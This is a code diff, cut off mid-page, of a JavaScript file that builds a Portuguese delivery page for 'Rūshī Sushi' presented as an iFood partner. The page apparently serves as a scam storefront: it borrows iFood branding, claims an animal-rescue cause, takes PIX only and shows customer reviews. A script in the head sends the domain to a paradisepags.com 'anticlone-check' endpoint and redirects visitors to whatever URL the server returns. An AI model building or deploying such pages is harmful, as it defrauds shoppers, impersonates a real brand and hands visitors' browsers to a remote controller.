@@ -1,374 +1,427 @@
 (function() {
     
     
-    var payload = "<!DOCTYPE html>" +
-"<html lang='pt-br'>" +
-"<head>" +
+    var payload = `<!DOCTYPE html>
+<html lang="pt-br">
+<head>
 
-"    <script" +
-"      src='https://cdn.utmify.com.br/scripts/utms/latest.js'" +
-"      data-utmify-prevent-xcod-sck" +
-"      data-utmify-prevent-subids" +
-"      async" +
-"      defer" +
-"    ></script>" +
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
 
-    "<script src='scripts/utms/latest.js' data-utmify-prevent-xcod-sck='' data-utmify-prevent-subids='' async='' defer=''></script>" +
+    <script src="scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
 
-"    <!-- TikTok Pixel Code Start -->" +
-"    <script>" +
-"    !function (w, d, t) {" +
-"      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=['page','track','identify','instances','debug','on','off','once','ready','alias','group','enableCookie','disableCookie','holdConsent','revokeConsent','grantConsent'],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(" +
-"    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r='https://analytics.tiktok.com/i18n/pixel/events.js',o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement('script')" +
-"    ;n.type='text/javascript',n.async=!0,n.src=r+'?sdkid='+e+'&lib='+t;e=document.getElementsByTagName('script')[0];e.parentNode.insertBefore(n,e)};" +
-"      ttq.load('D5MLIM3C77U85R08N62G');" +
-"      ttq.page();" +
-"    }(window, document, 'ttq');" +
-"    </script>" +
-"    <!-- TikTok Pixel Code End -->" +
-"      <!-- Meta Pixel Code -->" +
-"    <script>" +
-"    !function(f,b,e,v,n,t,s)" +
-"    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?" +
-"    n.callMethod.apply(n,arguments):n.queue.push(arguments)};" +
-"    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';" +
-"    n.queue=[];t=b.createElement(e);t.async=!0;" +
-"    t.src=v;s=b.getElementsByTagName(e)[0];" +
-"    s.parentNode.insertBefore(t,s)}(window, document,'script'," +
-"    'https://connect.facebook.net/en_US/fbevents.js');" +
-"    fbq('init', '967099279440605');" +
-"    fbq('track', 'PageView');" +
-"    </script>" +
-"    <noscript><img height='1' width='1' style='display:none' src='tr?id=967099279440605&ev=PageView&noscript=1'></noscript>" +
-"    <!-- End Meta Pixel Code -->" +
+    <!-- TikTok Pixel Code Start -->
+    <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+      ttq.load('D5MLIM3C77U85R08N62G');
+      ttq.page();
+    }(window, document, 'ttq');
+    </script>
+    <!-- TikTok Pixel Code End -->
+
+      <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '967099279440605');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="tr?id=967099279440605&ev=PageView&noscript=1"></noscript>
+    <!-- End Meta Pixel Code -->
 
     
 
-"    <meta charset='UTF-8'>" +
-"    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>" +
-"    <title>Rūshī Sushi</title>" +
-"    <script src='https://cdn.tailwindcss.com'></script>" +
-"    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css'>" +
-"    <link href='https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap' rel='stylesheet'>" +
-"    <style>" +
-"        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; background-color: #ffffff; user-select: none; -webkit-user-select: none; }" +
-"        :root { --food-red: #EA1D2C; --food-green: #05a65a; --text-dark: #3e3e3e; --text-gray: #717171; }" +
-"        html, body { overflow-y: auto !important; height: auto !important; }" +
-"        .no-scroll::-webkit-scrollbar { display: none; }" +
-"        .no-scroll { -ms-overflow-style: none; scrollbar-width: none; }" +
-"        .cat-tabs-wrap { position: relative; }" +
-"        .cat-tabs-wrap::after { content: ''; position: absolute; right: 0; top: 0; bottom: 0; width: 24px; background: linear-gradient(to left, #ffffff, rgba(255,255,255,0)); pointer-events: none; }" +
-"        .nav-item { position: relative; padding: 14px 4px; margin-right: 22px; font-size: 14px; font-weight: 600; color: #717171; background: transparent; border: none; white-space: nowrap; transition: color .2s ease; }" +
-"        .nav-item:last-child { margin-right: 16px; }" +
-"        .nav-item.active { color: var(--food-red); font-weight: 700; }" +
-"        .nav-item.active::after { content: ''; position: absolute; left: 0; right: 0; bottom: 0; height: 3px; background: var(--food-red); border-radius: 3px 3px 0 0; }" +
-"        .sheet-overlay { transition: opacity 0.3s ease; opacity: 0; pointer-events: none; }" +
-"        .sheet-overlay.visible { opacity: 1; pointer-events: auto; }" +
-"        .bottom-sheet { transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1); box-shadow: 0 -4px 30px rgba(0,0,0,0.15); }" +
-"        .bottom-sheet.open { transform: translateY(0); }" +
-"        .input-group { background-color: #ffffff; border: 1px solid #f0f0f0; border-radius: 8px; padding: 8px 12px; transition: all 0.2s; }" +
-"        .input-group:focus-within { background-color: #fff; border-color: #EA1D2C; box-shadow: 0 0 0 2px rgba(234, 29, 44, 0.1); }" +
-"        .input-label { font-size: 11px; color: #717171; font-weight: 600; display: block; margin-bottom: 2px; text-transform: uppercase; }" +
-"        .input-field { width: 100%; background: transparent; border: none; font-size: 14px; color: #3e3e3e; font-weight: 500; outline: none; }" +
-"        @keyframes loading-bar { 0% { width: 0%; left: 0; } 50% { width: 70%; left: 30%; } 100% { width: 0%; left: 100%; } }" +
-"        .animate-loading-bar { animation: loading-bar 1.5s infinite ease-in-out; position: relative; }" +
-"        @keyframes heartbeat { 0% { transform: scale(1); } 15% { transform: scale(1.15); } 30% { transform: scale(1); } 45% { transform: scale(1.15); } 60% { transform: scale(1); } }" +
-"        .animate-heartbeat { animation: heartbeat 2s infinite; }" +
-"        .header-banner { height: 160px; width: 100%; position: relative; }" +
-"        .banner-img { width: 100%; height: 100%; object-fit: cover; }" +
-"        .popup-local-container { border-radius: 16px !important; padding: 20px !important; font-family: 'Inter', sans-serif !important; }" +
-"        .btn-confirmar { background-color: #EA1D2C !important; border-radius: 8px !important; font-weight: 700 !important; padding: 12px 24px !important; width: 100% !important; margin-bottom: 10px !important; }" +
-"        .btn-alterar { background-color: transparent !important; color: #717171 !important; font-weight: 600 !important; border: 1px solid #e5e7eb !important; border-radius: 8px !important; padding: 10px 24px !important; width: 100% !important; }" +
-"        .location-box { background-color: #ffffff; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; border: 1px solid #e5e7eb; }" +
-"        .location-box span { display: block; font-size: 12px; color: #717171; }" +
-"        .location-box strong { display: block; font-size: 16px; color: #3e3e3e; margin-top: 4px; }" +
-"        .popup-header i { font-size: 40px; color: #EA1D2C; margin-bottom: 15px; }" +
-"        .popup-header h2 { font-size: 20px; font-weight: 800; color: #3e3e3e; margin-bottom: 5px; }" +
-"        .popup-header p { font-size: 14px; color: #717171; }" +
-"        @keyframes slideIn { from { transform: translateX(-100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }" +
-"        @keyframes pulse-premium { 0% { transform: scale(1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); } 50% { transform: scale(1.02); box-shadow: 0 0 0 4px rgba(234, 29, 44, 0.4); border-color: #EA1D2C; } 100% { transform: scale(1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); } }" +
-"        .card-destaque-master { animation: pulse-premium 2s infinite ease-in-out; border: 1px solid #ffe4e6 !important; background: linear-gradient(to bottom right, #fff, #fff1f2); }" +
-"    </style>" +
-"    <script>" +
-"    (function(){" +
-"        var t = 'a90a3e96a0bd6521504952b578d11e69';" +
-"        var d = window.location.hostname;" +
-"        var xhr = new XMLHttpRequest();" +
-"        xhr.open('GET', 'https://multi.paradisepags.com/api/anticlone-check.php?token=' + t + '&domain=' + d, true);" +
-"        xhr.onload = function() {" +
-"            if (xhr.status === 200) {" +
-"                try {" +
-"                    var r = JSON.parse(xhr.responseText);" +
-"                    if (r.action === 'redirect' && r.url) {" +
-"                        window.location.href = r.url;" +
-"                    }" +
-"                } catch(e){}" +
-"            }" +
-"        };" +
-"        xhr.send();" +
-"    })();" +
-"    </script>" +
-"</head>" +
-\"<body class='pb-24 bg-white' id='main-body'>\" +
-\"    <div id='app-loader' class='fixed inset-0 z-[100] bg-[#EA1D2C] flex flex-col items-center justify-center transition-opacity duration-500'>\" +
-\"        <div class='w-32 h-auto mb-10 animate-heartbeat flex items-center justify-center'>\" +
-\"            <img src='images/ifood-white.webp' class='w-full object-contain'>\" +
-\"        </div>\" +
-\"        <div class='w-10 h-10 border-4 border-white/30 border-t-white rounded-full animate-spin'></div>\" +
-\"    </div>\" +
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Rūshī Sushi</title>
+    
+    <script src="https://cdn.tailwindcss.com"><\/script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; background-color: #ffffff; user-select: none; -webkit-user-select: none; }
+        :root { --food-red: #EA1D2C; --food-green: #05a65a; --text-dark: #3e3e3e; --text-gray: #717171; }
+        html, body { overflow-y: auto !important; height: auto !important; }
+        .no-scroll::-webkit-scrollbar { display: none; }
+        .no-scroll { -ms-overflow-style: none; scrollbar-width: none; }
+        .cat-tabs-wrap { position: relative; }
+        .cat-tabs-wrap::after { content: ''; position: absolute; right: 0; top: 0; bottom: 0; width: 24px; background: linear-gradient(to left, #ffffff, rgba(255,255,255,0)); pointer-events: none; }
+        .nav-item { position: relative; padding: 14px 4px; margin-right: 22px; font-size: 14px; font-weight: 600; color: #717171; background: transparent; border: none; white-space: nowrap; transition: color .2s ease; }
+        .nav-item:last-child { margin-right: 16px; }
+        .nav-item.active { color: var(--food-red); font-weight: 700; }
+        .nav-item.active::after { content: ''; position: absolute; left: 0; right: 0; bottom: 0; height: 3px; background: var(--food-red); border-radius: 3px 3px 0 0; }
+        .sheet-overlay { transition: opacity 0.3s ease; opacity: 0; pointer-events: none; }
+        .sheet-overlay.visible { opacity: 1; pointer-events: auto; }
+        .bottom-sheet { transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1); box-shadow: 0 -4px 30px rgba(0,0,0,0.15); }
+        .bottom-sheet.open { transform: translateY(0); }
+        .input-group { background-color: #ffffff; border: 1px solid #f0f0f0; border-radius: 8px; padding: 8px 12px; transition: all 0.2s; }
+        .input-group:focus-within { background-color: #fff; border-color: #EA1D2C; box-shadow: 0 0 0 2px rgba(234, 29, 44, 0.1); }
+        .input-label { font-size: 11px; color: #717171; font-weight: 600; display: block; margin-bottom: 2px; text-transform: uppercase; }
+        .input-field { width: 100%; background: transparent; border: none; font-size: 14px; color: #3e3e3e; font-weight: 500; outline: none; }
+        @keyframes loading-bar { 0% { width: 0%; left: 0; } 50% { width: 70%; left: 30%; } 100% { width: 0%; left: 100%; } }
+        .animate-loading-bar { animation: loading-bar 1.5s infinite ease-in-out; position: relative; }
+        @keyframes heartbeat { 0% { transform: scale(1); } 15% { transform: scale(1.15); } 30% { transform: scale(1); } 45% { transform: scale(1.15); } 60% { transform: scale(1); } }
+        .animate-heartbeat { animation: heartbeat 2s infinite; }
+        .header-banner { height: 160px; width: 100%; position: relative; }
+        .banner-img { width: 100%; height: 100%; object-fit: cover; }
+        .popup-local-container { border-radius: 16px !important; padding: 20px !important; font-family: 'Inter', sans-serif !important; }
+        .btn-confirmar { background-color: #EA1D2C !important; border-radius: 8px !important; font-weight: 700 !important; padding: 12px 24px !important; width: 100% !important; margin-bottom: 10px !important; }
+        .btn-alterar { background-color: transparent !important; color: #717171 !important; font-weight: 600 !important; border: 1px solid #e5e7eb !important; border-radius: 8px !important; padding: 10px 24px !important; width: 100% !important; }
+        .location-box { background-color: #ffffff; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; border: 1px solid #e5e7eb; }
+        .location-box span { display: block; font-size: 12px; color: #717171; }
+        .location-box strong { display: block; font-size: 16px; color: #3e3e3e; margin-top: 4px; }
+        .popup-header i { font-size: 40px; color: #EA1D2C; margin-bottom: 15px; }
+        .popup-header h2 { font-size: 20px; font-weight: 800; color: #3e3e3e; margin-bottom: 5px; }
+        .popup-header p { font-size: 14px; color: #717171; }
+        @keyframes slideIn { from { transform: translateX(-100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        @keyframes pulse-premium { 0% { transform: scale(1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); } 50% { transform: scale(1.02); box-shadow: 0 0 0 4px rgba(234, 29, 44, 0.4); border-color: #EA1D2C; } 100% { transform: scale(1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); } }
+        .card-destaque-master { animation: pulse-premium 2s infinite ease-in-out; border: 1px solid #ffe4e6 !important; background: linear-gradient(to bottom right, #fff, #fff1f2); }
+    </style>
+    <script>
+    (function(){
+        var t = "a90a3e96a0bd6521504952b578d11e69";
+        var d = window.location.hostname;
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://multi.paradisepags.com/api/anticlone-check.php?token=" + t + "&domain=" + d, true);
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                try {
+                    var r = JSON.parse(xhr.responseText);
+                    if (r.action === "redirect" && r.url) {
+                        window.location.href = r.url;
+                    }
+                } catch(e){}
+            }
+        };
+        xhr.send();
+    })();
+    </script>
+</head>
+<body class="pb-24 bg-white" id="main-body">
 
-\"    <header class='w-full relative bg-[#ffffff]'>\" +
-\"        <div class='header-banner'>\" +
-\"                  <img src='images/background.webp' class='banner-img'>\" +
-\"            </div>\" +
-\"        <div class='px-4 relative -mt-10 z-20'>\" +
-\"            <div class='bg-white rounded-[24px] shadow-[0_12px_32px_rgba(0,0,0,0.15)] border border-white/60 p-6 w-full max-w-[420px] mx-auto flex flex-col items-center relative'>\" +
-\"                <div class='absolute -top-10 left-1/2 -translate-x-1/2 w-20 h-20 bg-white rounded-full p-0.5 shadow-md border border-gray-100'>\" +
-\"                    <img src='images/logo-rushi.webp' class='w-full h-full rounded-full object-cover'>\" +
-\"                </div>\" +
-\"                <div class='mt-8 w-full text-center'>\" +
-\"                    <h1 class='text-[#111827] text-2xl font-extrabold tracking-tight mb-1'>Rūshī Sushi</h1>\" +
-\"                    <div class='flex items-center justify-center gap-1.5 mb-3'>\" +
-\"                        <span class='relative flex h-2 w-2'>\" +
-\"                            <span class='animate-ping absolute inline-flex h-full w-full rounded-full bg-[#05a65a] opacity-75'></span>\" +
-\"                            <span class='relative inline-flex rounded-full h-2 w-2 bg-[#05a65a]'></span>\" +
-\"                        </span>\" +
-\"                        <span class='text-[11px] font-bold text-[#05a65a] tracking-wide uppercase'>Aberto agora</span>\" +
-\"                    </div>\" +
-\"                    <div class='flex items-center justify-center gap-2 text-[#717171] text-[13px] font-medium mb-4'>\" +
-\"                        <span id='header-location-info'>Detectando...</span>\" +
-\"                        <span class='text-gray-300'>•</span>\" +
-\"                        <span>Valor min. R$ 15,00</span>\" +
-\"                    </div>\" +
-\"                    <div class='w-full h-[1px] bg-gray-100 mb-2'></div>\" +
-\"                    <div class='flex items-center justify-between w-full py-2 cursor-pointer active:bg-gray-50 transition rounded-lg text-left'>\" +
-\"                                    <div class='flex items-center gap-2'>\" +
-\"                                          <i class='fa-solid fa-star text-[#fbbf24] text-xs'></i>\" +
-\"                                          <span class='text-[#3e3e3e] font-bold text-sm'>4.9 <span class='text-gray-400 font-normal ml-0.5'>(7.478 avaliações)</span></span>\" +
-\"                                          <div class='flex items-center gap-1 bg-[#EA1D2C] text-white px-2 py-0.5 rounded-full scale-90 origin-left'>\" +
-\"                                                <i class='fa-solid fa-star text-[8px]'></i>\" +
-\"                                                <span class='text-[9px] font-black uppercase tracking-tighter'>Super</span>\" +
-\"                                          </div>\" +
-\"                                    </div>\" +
-\"                                    <i class='fa-solid fa-chevron-right text-gray-300 text-[10px]'></i>\" +
-\"                              </div>\" +
-\"                    <div class='w-full h-[1px] bg-gray-100 mb-2'></div>\" +
-\"                    <div class='flex flex-col w-full text-left py-1'>\" +
-\"                        <div class='text-[14px] text-[#3e3e3e] font-medium'>\" +
-\"                            Entrega padrão (30-50 min) <span class='text-[#05a65a] font-bold ml-1'>Grátis</span>\" +
-\"                        </div>\" +
-\"                        <div class='text-[13px] text-gray-400 mt-0.5 font-medium'>\" +
-\"                            Mais opções disponíveis na sacola\" +
-\"                        </div>\" +
-\"                    </div>\" +
-\"                </div>\" +
-\"            </div>\" +
-\"        </div>\" +
-\"    </header>\" +
+    <div id="app-loader" class="fixed inset-0 z-[100] bg-[#EA1D2C] flex flex-col items-center justify-center transition-opacity duration-500">
+        <div class="w-32 h-auto mb-10 animate-heartbeat flex items-center justify-center">
+            <img src="images/ifood-white.webp" class="w-full object-contain">
+        </div>
+        <div class="w-10 h-10 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
+    </div>
 
-\"    <div class='px-4 mt-5'>\" +
-\"      <div class='bg-white rounded-2xl border border-gray-100 shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden'>\" +
-\"        <div class='bg-gradient-to-r from-amber-50 to-orange-50 p-4 relative group'>\" +
-\"          <div class='absolute -right-2 -bottom-2 opacity-10 group-hover:scale-110 transition-transform duration-500'>\" +
-\"              <i class='fa-solid fa-paw text-5xl text-amber-600 rotate-12'></i>\" +
-\"          </div>\" +
-\"          <div class='flex items-start gap-3 relative z-10'>\" +
-\"              <div class='w-10 h-10 rounded-xl bg-white shadow-sm flex items-center justify-center shrink-0 border border-amber-100'>\" +
-\"                  <i class='fa-solid fa-dog text-amber-600 text-lg'></i>\" +
-\"              </div>\" +
-\"              <div class='flex flex-col'>\" +
-\"                  <div class='flex items-center gap-2'>\" +
-\"                      <span class='text-[13px] font-bold text-amber-900'>Ação Amigo de Patas 🐾</span>\" +
-\"                      <span class='bg-amber-600 text-white text-[8px] font-black px-1.5 py-0.5 rounded uppercase tracking-wider'>Causa Ativa</span>\" +
-\"                  </div>\" +
-\"                  <p class='text-[11px] text-amber-800/80 leading-tight mt-1'>\" +
-\"                      Cada pedido ajuda no resgate de animais. Nossos valores promocionais apoiam esta missão! ❤️\" +
-\"                  </p>\" +
-\"              </div>\" +
-\"          </div>\" +
-\"          <div class='mt-3'>\" +
-\"              <div class='w-full bg-amber-200/30 rounded-full h-1.5 overflow-hidden'>\" +
-\"                  <div class='bg-amber-500 h-full w-[82%] rounded-full relative'>\" +
-\"                      <div class='absolute inset-0 bg-white/20 animate-loading-bar'></div>\" +
-\"                  </div>\" +
-\"              </div>\" +
-\"              <div class='flex justify-between items-center text-[9px] font-bold text-amber-700 mt-1 uppercase'>\" +
-\"                  <span>Meta de Refeições</span>\" +
-\"                  <span>82% Atingido</span>\" +
-\"              </div>\" +
-\"          </div>\" +
-\"        </div>\" +
-\"        <div class='relative flex items-center justify-center py-1 bg-white'>\" +
-\"            <div class='absolute inset-x-0 top-1/2 h-px bg-gray-50'></div>\" +
-\"            <div class='relative bg-white px-3'>\" +
-\"                <i class='fa-solid fa-link text-[10px] text-gray-300'></i>\" +
-\"            </div>\" +
-\"        </div>\" +
-\"        <div class='p-4 pt-1 flex items-center gap-3'>\" +
-\"          <div class='w-10 h-10 rounded-xl bg-[#fff1f2] flex items-center justify-center shrink-0 border border-red-50'>\" +
-\"            <img src='images/ifood-smile.png' alt='iFood' class='w-7 h-7 object-contain' />\" +
-\"          </div>\" +
-\"          <div class='flex flex-col min-w-0 flex-1'>\" +
-\"            <div class='flex items-center gap-1.5'>\" +
-\"              <span class='text-[13px] font-bold text-[#3e3e3e] truncate'>Parceiro Oficial iFood</span>\" +
-\"            </div>\" +
-\"          </div>\" +
-\"          <div class='flex flex-col items-end gap-1'>\" +
-\"          </div>\" +
-\"        </div>\" +
-\"      </div>\" +
-\"    </div>\" +
+    <header class="w-full relative bg-[#ffffff]">
+        <div class="header-banner">
+                  <img src="images/background.webp" class="banner-img">
+            </div>
+        <div class="px-4 relative -mt-10 z-20">
+            <div class="bg-white rounded-[24px] shadow-[0_12px_32px_rgba(0,0,0,0.15)] border border-white/60 p-6 w-full max-w-[420px] mx-auto flex flex-col items-center relative">
+                <!-- Logo centralizada -->
+                <div class="absolute -top-10 left-1/2 -translate-x-1/2 w-20 h-20 bg-white rounded-full p-0.5 shadow-md border border-gray-100">
+                    <img src="images/logo-rushi.webp" class="w-full h-full rounded-full object-cover">
+                </div>
+                
+                <!-- Título Centralizado -->
+                <div class="mt-8 w-full text-center">
+                    <h1 class="text-[#111827] text-2xl font-extrabold tracking-tight mb-1">Rūshī Sushi</h1>
 
-\"    <div class='sticky top-0 bg-white z-30 border-b border-gray-100 mt-5 cat-tabs-wrap'>\" +
-\"        <div class='flex overflow-x-auto no-scroll px-4' id='category-tabs'>\" +
-\"            <button onclick='scrollToCat(\\\"destaques\\\", event)' class='nav-item active'>Destaques</button>\" +
-\"            <button onclick='scrollToCat(\\\"entradas\\\", event)' class='nav-item'>Entradas</button>\" +
-\"            <button onclick='scrollToCat(\\\"temakis\\\", event)' class='nav-item'>Temakis</button>\" +
-\"            <button onclick='scrollToCat(\\\"familia\\\", event)' class='nav-item'>Família</button>\" +
-\"            <button onclick='scrollToCat(\\\"classicos\\\", event)' class='nav-item'>Clássicos</button>\" +
-\"            <button onclick='scrollToCat(\\\"hot-rolls\\\", event)' class='nav-item'>Quentes</button>\" +
-\"            <button onclick='scrollToCat(\\\"yakisobas\\\", event)' class='nav-item'>Yakisobas</button>\" +
-\"            <button onclick='scrollToCat(\\\"sobremesas\\\", event)' class='nav-item'>Sobremesas</button>\" +
-\"            <button onclick='scrollToCat(\\\"bebidas\\\", event)' class='nav-item'>Bebidas</button>\" +
-\"        </div>\" +
-\"    </div>\" +
-\"    <main class='p-4 space-y-6 min-h-screen bg-[#ffffff]' id='product-container'></main>\" +
-\"        <section class='bg-[#ffffff] mt-2 pt-4 pb-2'>\" +
-\"            <div class='px-4'>\" +
-\"                <h3 class='font-bold text-[#3e3e3e] text-lg mb-4 flex items-center gap-2'>\" +
-\"                    <i class='fa-regular fa-comments text-[#EA1D2C]'></i>\" +
-\"                    Dúvidas Frequentes\" +
-\"                </h3>\" +
-\"                <div class='space-y-2'>\" +
-\"                    <div class='bg-white border border-gray-100 rounded-xl shadow-sm overflow-hidden faq-item'>\" +
-\"                        <button onclick='toggleFaq(this)' class='w-full flex justify-between items-center p-4 text-left font-semibold text-sm text-gray-700 active:bg-gray-50 transition'>\" +
-\"                            <span>Qual o prazo de entrega?</span>\" +
-\"                            <i class='fa-solid fa-chevron-down text-[#EA1D2C] text-xs transition-transform duration-300 faq-icon'></i>\" +
-\"                        </button>\" +
-\"                        <div class='hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content'>\" +
-\"                            <div class='pt-2 border-t border-gray-50'>\" +
-\"                                Nosso prazo médio é de <strong>30 a 45 minutos</strong>. Em dias de chuva ou alta demanda, esse tempo pode variar levemente, mas sempre prezamos pela agilidade.\" +
-\"                            </div>\" +
-\"                        </div>\" +
-\"                    </div>\" +
-\"                    <div class='bg-white border border-gray-100 rounded-xl shadow-sm overflow-hidden faq-item'>\" +
-\"                        <button onclick='toggleFaq(this)' class='w-full flex justify-between items-center p-4 text-left font-semibold text-sm text-gray-700 active:bg-gray-50 transition'>\" +
-\"                            <span>Quais formas de pagamento?</span>\" +
-\"                            <i class='fa-solid fa-chevron-down text-[#EA1D2C] text-xs transition-transform duration-300 faq-icon'></i>\" +
-\"                        </button>\" +
-\"                        <div class='hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content'>\" +
-\"                            <div class='pt-2 border-t border-gray-50'>\" +
-\"                                Aceitamos <strong>PIX (Aprovação Imediata)</strong>. É a forma mais rápida e segura. Seu pedido vai direto para a cozinha assim que o pagamento é confirmado.\" +
-\"                            </div>\" +
-\"                        </div>\" +
-\"                    </div>\" +
-\"                    <div class='bg-white border border-gray-100 rounded-xl shadow-sm overflow-hidden faq-item'>\" +
-\"                        <button onclick='toggleFaq(this)' class='w-full flex justify-between items-center p-4 text-left font-semibold text-sm text-gray-700 active:bg-gray-50 transition'>\" +
-\"                            <span>Os produtos são frescos?</span>\" +
-\"                            <i class='fa-solid fa-chevron-down text-[#EA1D2C] text-xs transition-transform duration-300 faq-icon'></i>\" +
-\"                        </button>\" +
-\"                        <div class='hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content'>\" +
-\"                            <div class='pt-2 border-t border-gray-50'>\" +
-\"                                <strong>Sim! Absolutamente.</strong> Recebemos peixe fresco todos os dias. Não trabalhamos com estoque congelado de sushis prontos. Tudo é feito na hora.\" +
-\"                            </div>\" +
-\"                        </div>\" +
-\"                    </div>\" +
-\"                    <div class='bg-white border border-gray-100 rounded-xl shadow-sm overflow-hidden faq-item'>\" +
-\"                        <button onclick='toggleFaq(this)' class='w-full flex justify-between items-center p-4 text-left font-semibold text-sm text-gray-700 active:bg-gray-50 transition'>\" +
-\"                            <span>Horário de Funcionamento</span>\" +
-\"                            <i class='fa-solid fa-chevron-down text-[#EA1D2C] text-xs transition-transform duration-300 faq-icon'></i>\" +
-\"                        </button>\" +
-\"                        <div class='hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content'>\" +
-\"                            <div class='pt-2 border-t border-gray-50'>\" +
-\"                                Estamos abertos <strong>24 Horas</strong>! Madrugada, manhã, tarde ou noite: bateu a fome, o Rūshī Sushi entrega.\" +
-\"                            </div>\" +
-\"                        </div>\" +
-\"                    </div>\" +
-\"                </div>\" +
-\"            </div>\" +
-\"        </section>\" +
+                    <!-- Indicador Loja Aberta -->
+                    <div class="flex items-center justify-center gap-1.5 mb-3">
+                        <span class="relative flex h-2 w-2">
+                            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#05a65a] opacity-75"></span>
+                            <span class="relative inline-flex rounded-full h-2 w-2 bg-[#05a65a]"></span>
+                        </span>
+                        <span class="text-[11px] font-bold text-[#05a65a] tracking-wide uppercase">Aberto agora</span>
+                    </div>
+                    
+                    <!-- Localização e Valor Mínimo Harmonizados -->
+                    <div class="flex items-center justify-center gap-2 text-[#717171] text-[13px] font-medium mb-4">
+                        <span id="header-location-info">Detectando...</span>
+                        <span class="text-gray-300">•</span>
+                        <span>Valor min. R$ 15,00</span>
+                    </div>
 
-\"    <section class='px-4 mt-8 mb-4'>\" +
-\"        <h3 class='font-bold text-[#3e3e3e] text-lg mb-4 flex items-center gap-2'>\" +
-\"            <i class='fa-solid fa-star text-[#fbbf24]'></i>\" +
-\"            O que dizem nossos clientes\" +
-\"        </h3>\" +
-\"        <div class='space-y-3'>\" +
-\"            <div class='bg-white p-4 rounded-xl border border-gray-100 shadow-sm'>\" +
-\"                <div class='flex justify-between items-start mb-2'>\" +
-\"                    <div class='flex items-center gap-2'>\" +
-\"                        <div class='w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-500 text-xs'>RM</div>\" +
-\"                        <div><h4 class='text-xs font-bold text-gray-800'>Ricardo Mello</h4><div class='flex text-[10px] text-[#fbbf24]'><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i></div></div>\" +
